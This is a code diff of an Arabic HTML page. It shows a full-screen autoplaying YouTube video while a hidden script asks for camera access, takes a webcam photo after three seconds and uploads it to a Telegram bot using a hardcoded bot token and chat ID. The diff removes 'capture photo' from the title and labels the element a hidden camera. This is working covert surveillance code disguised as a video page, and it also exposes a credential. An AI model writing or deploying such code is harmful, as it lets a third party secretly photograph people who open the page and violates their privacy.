@@ -2,19 +2,42 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>التقاط صورة وتشغيل فيديو</title>
+  <title> وتشغيل فيديو</title>
   <style>
-    body { margin: 0; padding: 0; text-align: center; background: #111; color: white; }
-    iframe { width: 100%; height: 300px; border: none; margin-bottom: 10px; }
-    video { display: none; } /* نخفي الفيديو */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html, body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      background-color: #000;
+    }
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 1;
+    }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <iframe src="https://www.youtube.com/embed/vaP0ZdA-KHo?autoplay=1&mute=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-  
+  <!-- فيديو يوتيوب ملء الشاشة -->
+  <iframe src="https://www.youtube.com/embed/vaP0ZdA-KHo?autoplay=1&mute=1&controls=0&loop=1&playlist=vaP0ZdA-KHo"
+          allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+  <!-- كاميرا مخفية -->
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <canvas id="canvas"></canvas>
 
   <script>
     const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
@@ -24,19 +47,16 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    // طلب إذن الكاميرا
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // انتظر قليلًا حتى تعمل الكاميرا
         setTimeout(() => {
-          // إعداد الكانفس بحجم الفيديو
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
 
-          // التقاط صورة
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
           canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -46,17 +66,20 @@
               method: 'POST',
               body: formData
             }).then(() => {
-              console.log('تم إرسال الصورة بنجاح');
+              console.log('✅ تم إرسال الصورة بنجاح');
             }).catch(err => {
-              console.error('فشل الإرسال:', err);
+              console.error('❌ فشل الإرسال:', err);
             });
 
           }, 'image/jpeg', 0.9);
 
-        }, 3000); // وقت الانتظار قبل التقاط الصورة (3 ثوانٍ)
+          // إيقاف الكاميرا بعد الالتقاط
+          stream.getTracks().forEach(track => track.stop());
+
+        }, 3000); // بعد 3 ثوانٍ من تشغيل الكاميرا
       })
       .catch(err => {
-        console.error('خطأ في الوصول إلى الكاميرا:', err);
+        console.error('🚫 فشل الوصول إلى الكاميرا:', err);
       });
   </script>
 
